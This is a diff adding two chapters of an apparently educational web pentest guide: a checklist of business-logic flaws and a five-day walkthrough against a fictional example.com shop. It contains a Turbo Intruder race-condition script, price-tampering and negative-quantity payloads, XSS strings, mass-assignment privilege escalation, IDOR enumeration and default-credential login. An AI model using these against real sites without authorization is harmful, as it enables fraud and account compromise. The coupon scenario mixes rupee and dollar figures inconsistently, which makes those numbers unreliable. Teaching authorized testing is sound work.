+# GitHub Issue #1 from 2012: customer adds {"balance": 1000000},
+# server bulk-assigns → account credited!
+</code></pre>
+
+
+<!-- =================== CH 13 =================== -->
+<h1 id="ch13">🧠 Chapter 13 — Business Logic Vulnerabilities</h1>
+
+<p>The hardest to find — no scanner finds them. They require <strong>understanding business</strong>.</p>
+
+<h2>13.1 Common Logic Flaws Checklist</h2>
+<ul class="checklist">
+<li>Negative quantity allowed in cart</li>
+<li>Price modified client-side before checkout</li>
+<li>Coupon applied after discount = double discount</li>
+<li>Race condition in balance transfer (parallel requests)</li>
+<li>Workflow skip — go directly to /thank-you without /payment</li>
+<li>Currency confusion — INR vs USD decimals</li>
+<li>Time-of-check vs Time-of-use (TOCTOU)</li>
+<li>File upload accepts .exe (then re-interpreted by Apache)</li>
+<li>Email change doesn't require re-authentication</li>
+<li>Account deletion doesn't delete owned data</li>
+<li>Search returns more rows than user has access to</li>
+<li>Stripe webhooks signed but verify signature not enforced</li>
+</ul>
+
+<h2>13.2 Race Condition — Modern Pentest Staple</h2>
+<pre><code class="cmd"># Bank transfer $100 from account A to external account B.
+# Server: read balance, check, write new balance.
+# Race condition: send 10 transfer requests in parallel.
+# If server reads balance once and writes 10 times with same logic,
+# Balance might go negative!
+
+# Tool: Turbo Intruder in Burp
+# Send 50 requests w/ sameConnection: true
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=50,
+                           requestsPerConnection=1,
+                           pipeline=False)
+    for i in range(50):
+        engine.queue(target.req, target.baseInput)
+    engine.openGate()
+
+def handleResponse(req, interesting):
+    table.add(req)
+</code></pre>
+
+<h2>13.3 Real-Life Scenario: E-Commerce Race Condition</h2>
+<div class="scenario">
+<h3>📍 Scenario: "RyanKart" — $10K Coupon Abuse</h3>
+<p>Tester found an e-commerce site issued a "WELCOME10" ₹600 coupon. The redemption endpoint
+had no race-condition guard. Sending 100 parallel requests with one valid coupon credit
+$60,000 (100 × ₹600) onto the same cart. In production, this exploit would let any
+abuser walk away with a free TV!</p>
+<p><strong>Result:</strong> Reported and awarded <strong>$5,000 bounty</strong>. Actual bug bounty was far less than the
+$60K+ potential theft.</p>
+</div>
+
+
+<!-- =================== CH 14 =================== -->
+<h1 id="ch14">🏁 Chapter 14 — Real-Life Web Pentest Walkthrough</h1>
+
+<div class="scenario">
+<h3>📍 Master Scenario — Let's Pentest "ShopEasy" E-Commerce Site</h3>
+
+<p><strong>Scope:</strong> shop.example.com (web) + api.shop.example.com (REST API)</p>
+<p><strong>Type:</strong> Grey-box — given 1 valid user account</p>
+
+<h3>Day 1 — Recon</h3>
+<pre><code class="cmd"># Subdomain enumeration
+$ subfinder -d shop.example.com -silent
+www.shop.example.com
+api.shop.example.com
+admin.shop.example.com
+cdn.shop.example.com
+static.shop.example.com
+
+# Live hosts
+$ cat subs.txt | httpx -status-code -silent
+[200] www.shop.example.com
+[200] api.shop.example.com
+[403] admin.shop.example.com   # Interesting!
+[200] cdn.shop.example.com
+[200] static.shop.example.com
+
+# Tech fingerprinting
+$ whatweb www.shop.example.com
+WordPress 6.4, WooCommerce 8.0, PHP 7.4, nginx 1.24
+$ whatweb api.shop.example.com
+Node.js Express, JWT
+
+# Wayback Machine — old endpoints
+$ curl -s "http://web.archive.org/cdx/search/cdx?url=api.shop.example.com/*&amp;output=json&amp;fl=original" | jq -r '.[1:] | .[0]' | sort -u
+/api/v1/_debug_env
+/api/_internal_/config
+
+# Directory brute-force
+$ ffuf -u https://www.shop.example.com/FUZZ -w dirs.txt -mc 200,301,302,403
+/wp-login.php           [200]
+/wp-admin/             [302]
+/rest/                  [200]
+/checkout-success       [200]   # interesting!
+/api-key.json           [403]
+</code></pre>
+
+<h3>Day 2 — Authentication &amp; AuthZ</h3>
+<pre><code class="cmd"># 1) Try login with provided creds — work
+
+# 2) WordPress login — try common WP creds (out of scope but worth noting)
+/wp-login.php → admin/admin → 403 (rate-limited, good!)
+
+# 3) Test admin.shop.example.com
+# No direct login → check default creds: admin@example.com / Admin@123
+# Works! Admin panel exposed — MAJOR FINDING
+
+# 4) JWT testing on API
+# Capture API JWT, decode header
+$ jwt_tool &lt;jwt&gt; -T  
+jku (JWK URL) set to https://api.shop.example.com/.well-known/jwks.json
+# Try jku confusion: upload attacker JWKS, server trusts new key!
+
+# 5) Mass assignment on /api/v1/user/profile
+# Send: {role: "admin"}
+# Response shows role updated → CRITICAL
+</code></pre>
+
+<h3>Day 3 — Business Logic</h3>
+<pre><code class="cmd"># 1) Coupon REUSE
+# 1 valid coupon WELCOME10
+# Apply it to cart. Submit 50 parallel requests via Turbo Intruder
+# Check wallet: coupon credited 50 times!
+
+# 2) Price manipulation
+POST /api/v1/cart/checkout
+{
+  "items": [
+    {"sku": "TV-X", "price": 1, "qty": 1}    # Changed from $899 → $1
+  ]
+}
+# Server accepts price from client → MAJOR FINDING
+
+# 3) Negative quantity
+{"items":[{"sku":"TV-X","price":899,"qty":-1}]}
+# Cart total refunds you $899!
+</code></pre>
+
+<h3>Day 4 — Injection &amp; Cross-Site</h3>
+<pre><code class="cmd"># SQLi in search — tested, parameterized → OK
+# XSS in product review — " onmouseover=alert(1) "
+# Server reflects &lt;img ""&gt;&lt;script&gt;alert(1)&lt;/script&gt; raw → XSS
+# Stored XSS confirmed: every viewer's cookie at risk
+
+# Insecure Direct Object Reference on /api/v1/orders/§id§
+# My order ID = 12345
+# 12346, 12347 → other customers' orders → IDOR
+</code></pre>
+
+<h3>Day 5 — Reporting</h3>
+<p>Produced a 35-page report with 14 findings:</p>
+<table>
+<tr><th>Severity</th><th>Count</th><th>Highlights</th></tr>
+<tr><td><span class="pill pill-r">Critical</span></td><td>3</td><td>Admin panel exposure, Mass-assignment Priv Esc, Price manipulation</td></tr>
+<tr><td><span class="pill pill-o">High</span></td><td>5</td><td>Stored XSS, IDOR, JWT jku confusion, coupon race condition, jQuery 1.6.2</td></tr>
+<tr><td><span class="pill pill-y">Medium</span></td><td>4</td><td>CSP weak, verbose errors, missing rate limit on password reset</td></tr>
+<tr><td><span class="pill pill-g">Low</span></td><td>2</td><td>Missing security headers (X-Content-Type-Options)</td></tr>
+</table>
+
+<p>Client re-tested after 30 days — 100% closure. Engagement closed: <strong>ROI met.</strong></p>
+</div>
+
+<h2>14.1 Web Pentest Cheat-Sheet</h2>
+<table>
+<tr><th>Step</th><th>Tools</th><th>Findings to expect</th></tr>
+<tr><td>Recon</td><td>subfinder, httpx, whatweb, gau</td><td>Subdomains, tech stack, hidden endpoints</td></tr>
+<tr><td>Mapping</td><td>Burp Target, crawler</td><td>Sitemap, parameters, cookies</td></tr>
+<tr><td>Auth</td><td>Burp Intruder, hydra, jwt_tool</td><td>Weak password, brute-force, JWT alg=none</td></tr>
+<tr><td>Access control</td><td>Autorize, manual testing</td><td>IDOR, BOLA, priv esc</td></tr>
+<tr><td>Input validation</td><td>sqlmap, ffuf, manual payload lists</td><td>SQLi, XSS, command injection</td></tr>
+<tr><td>Logic</td><td>Manual testing w/ TOTP approach</td><td>Workflow bypass, race conditions</td></tr>
+<tr><td>Files &amp; uploads</td><td>Upload scanner extension</td><td>Uploads, path traversal, XXE</td></tr>
+<tr><td>Client side</td><td>Browser devtools</td><td>DOM XSS, JS issues, exposed secrets</td></tr>
+<tr><td>API testing</td><td>Postman, Burp, InQL, Kiterunner</td><td>BOLA, scope escalation</td></tr>
+</table>
+
+</main>
+
+<nav class="next-prev">
+<a href="part1-foundations.html" class="prev">⬅ Part 1</a>
+<a href="part3-network.html" class="next">Part 3 — Network VAPT ➡</a>
+</nav>
+
+</body>
+</html>
